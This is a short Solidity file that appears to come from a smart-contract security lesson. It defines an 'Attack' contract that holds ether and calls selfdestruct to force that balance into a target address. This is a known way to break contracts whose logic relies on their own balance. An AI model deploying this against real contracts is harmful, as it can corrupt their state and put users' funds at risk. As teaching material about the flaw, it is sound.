// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

// attack contract
contract Attack {
    constructor() payable {}

    // Use selfdestruct to transfer the balance of the contract to the attacker's address
    function attack(address _addr) external {
        selfdestruct(payable(_addr));
    }

    // check the balance of the contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
